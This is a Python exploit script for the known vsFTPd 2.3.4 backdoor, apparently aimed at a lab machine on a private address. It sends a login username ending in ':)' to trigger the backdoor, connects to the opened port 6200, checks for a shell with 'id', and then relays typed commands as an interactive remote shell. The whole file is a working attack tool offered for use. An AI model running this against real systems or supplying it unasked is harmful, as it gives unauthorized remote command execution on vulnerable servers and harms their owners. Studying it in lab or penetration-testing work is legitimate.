import socket    # sockets
import sys       # fancy printing (fancy)
import random    # random user and password (fancy)
import string    # ascii_lowercase (fancy)
import threading # thread to print recv output of commands
import time      # timing prints and sockets
import os        # sys.exit wouldnt exit totally so...

HOST = "192.168.56.101"
PORT = 21

def activate_exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
    except Exception as e:
        print("[!!] Port 21 is not available on target machine\n")
        s.close()
        sys.exit(1)

    print("\n")
    print("[+] Connection established with [{0}:{1}]".format(HOST, PORT))
    time.sleep(0.5)
    banner = s.recv(1024).decode('utf-8') # retrieve banner
    time.sleep(0.5)
    if "vsFTPd 2.3.4" not in banner:      # Check version
        print("[!!] Invalid version or service: " + banner)
        s.close()
        sys.exit(2)
    else:
        print("[+] Valid version: " + banner)
        # Generate random username
        rand_user = ''.join(random.choice(string.ascii_lowercase) for _ in range(7))
        USER = "USER " + rand_user + ":)\r\n"
        print("[*] Sending " + USER[:-2] + "...")
        time.sleep(0.5)
        s.send(USER.encode('utf-8'))
        resp = s.recv(1024).decode('utf-8')

        if "530" in resp:
            print("[!] Server configured for anon only. Exiting...")
            s.close()
            sys.exit(3)
        elif "331" not in resp:
            print("[!] Server responded unexpectedly. Exiting...")
            s.close()
            sys.exit(4)
        # Generate random password
        rand_pass = ''.join(random.choice(string.ascii_lowercase) for _ in range(7))
        PASS = "PASS " + rand_pass + "\r\n"
        print("[*] Sending " + PASS[:-2] + "...")
        s.send(PASS.encode('utf-8'))
        time.sleep(1.5)
        # Don't bother reading the response
        print("[+] Port 6200 succesfully open.\n")
        time.sleep(1.5)
        s.close()

def print_output(sock, status):
    while status:
        try:
            print(sock.recv(1024).decode('utf-8'))
        except Exception as e:
            return

def fancy_print(string):
    sys.stdout.write(string)
    sys.stdout.flush()

def check_shell(sock):
    sock.send("id\n".encode('utf-8'))
    resp = sock.recv(1024).decode('utf-8')
    if "uid=" not in resp:
        return False
    return True

def main():
    activate_exploit()
    print("[+] Starting shell spawn routine...")
    time.sleep(0.5)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    status = True

    try:
        sock.connect((HOST, 6200))
    except Exception as e:
        print("[!] Error while trying to connect to port 6200")
        sys.exit(5)

    print("\n")
    print("[+] Connection established with port 6200")
    time.sleep(0.5)
    fancy_print("[+] Checking if service on port 6200 is a shell... ")
    time.sleep(3)
    if check_shell(sock):
        fancy_print("SUCCESS!\n\n")
    else:
        fancy_print("FAILURE!\n")
        print("[!!] Service does not appear to be a shell. Exiting...")
        sock.close()
        sys.exit(6)

    time.sleep(1)
    print("\t\t[Write commands]")
    reader_thread = threading.Thread(target=print_output, args=(sock, status)).start()

    while True:
        cmd = input("")
        if "exit" in cmd:
            try:
                reader_thread.join()
                sock.close()
                os._exit(0)
            except:
                os._exit(-1)
        sock.send((cmd + '\n').encode('utf-8'))

if __name__ == '__main__':
    main()


"""
Exit codes:
-1 - Quitted but wtf
 0 - Typed "exit" while on remote shell
 1 - Unable to connect to port 21
 2 - FTP server not using vsFTPd version 2.3.4
 3 - FTP server configured for anonymous login only
 4 - FTP server responded unexpectedly to login attempt
 5 - Unable to connect to port 6200 after exploitation
 6 - Service on port 6200 is not a shell
"""
